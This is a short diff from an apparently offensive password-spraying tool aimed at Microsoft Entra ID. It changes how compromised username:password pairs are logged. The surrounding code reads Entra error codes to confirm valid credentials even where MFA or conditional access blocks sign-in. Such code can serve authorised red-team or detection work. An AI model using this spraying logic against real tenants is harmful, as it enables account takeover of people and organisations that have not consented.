@@ -255,7 +255,8 @@ def entra_spray(
                     compromised_users.append(f"{username} : {password}")
                     log_message(
                         f"[+] {username} : {password} - NOTE: Conditional access policy (MFA: DUO or other) is in use.",
-                        compromised_user_log,
+                        full_log,
+                        compromised_users_log=compromised_user_log,
                         color=Fore.GREEN,
                     )
                 elif "AADSTS53003" in resp_err:
@@ -263,7 +264,8 @@ def entra_spray(
                     compromised_users.append(f"{username} : {password}")
                     log_message(
                         f"[+] {username} : {password} - NOTE: Conditional access policy is in place and blocks token issuance.",
-                        compromised_user_log,
+                        full_log,
+                        compromised_users_log=compromised_user_log,
                         color=Fore.GREEN,
                     )
                 elif "AADSTS53000" in resp_err:
@@ -271,7 +273,8 @@ def entra_spray(
                     compromised_users.append(f"{username} : {password}")
                     log_message(
                         f"[+] {username} : {password} - NOTE: Conditional access policy is in place and requires a compliant device, and the device isn't compliant.",
-                        compromised_user_log,
+                        full_log,
+                        compromised_users_log=compromised_user_log,
                         color=Fore.GREEN,
                     )
                 elif "AADSTS530035" in resp_err:
@@ -279,7 +282,8 @@ def entra_spray(
                     compromised_users.append(f"{username} : {password}")
                     log_message(
                         f"[+] {username} : {password} - NOTE: Access has been blocked by security defaults. The request is deemed unsafe by security defaults policies",
-                        compromised_user_log,
+                        full_log,
+                        compromised_users_log=compromised_user_log,
                         color=Fore.GREEN,
                     )
                 elif "AADSTS50128" in resp_err or "AADSTS50059" in resp_err:
